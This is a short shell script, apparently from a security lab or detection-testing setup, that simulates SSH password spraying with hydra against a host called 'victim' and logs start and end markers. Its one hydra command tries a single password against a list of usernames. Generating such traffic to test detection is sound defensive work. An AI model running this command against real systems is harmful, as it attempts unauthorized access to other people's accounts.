#!/bin/sh
# ssh-password-spraying: one wrong password tried against many accounts
# from this IP. None of the listed usernames use this password.
set -eu
VICTIM="${VICTIM_HOST:-victim}"
echo "SCENARIO_START spraying $(date -u +%Y-%m-%dT%H:%M:%SZ)"
hydra -L /lab/wordlist-users.txt -p letmein123 -t 4 -I ssh://"$VICTIM" || true
echo "SCENARIO_END spraying"
